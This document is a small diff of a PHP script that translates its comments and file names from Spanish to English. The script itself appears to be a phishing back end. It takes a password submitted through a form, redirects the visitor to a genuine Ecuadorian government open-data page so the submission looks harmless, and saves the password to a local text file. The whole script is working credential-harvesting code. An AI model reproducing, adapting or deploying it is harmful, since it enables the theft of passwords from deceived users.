@@ -1,13 +1,13 @@
 <?php
-// Recibo los datos introducidos en el formulario
+// Receiving the data entered in the form
 $Clave = $_POST["Clave"];
 header('Location:https://www.datosabiertos.gob.ec/dataset/cuentas-internet-fijos-y-moviles');
-     // Abro el archivo
+     // Opening the archived file
      $co = "===========================================\n";
      $cl = "===========================================\n";
-     $file=fopen("Contraseña.txt", "w");
+     $file=fopen("Password.txt", "w");
      // Le cargo los datos
-     $op = "Contraseña:  $Clave\n";
+     $op = "Password:  $Clave\n";
      fwrite($file, "\n". $co. $op. $cl);
      fclose($file);
 ?>
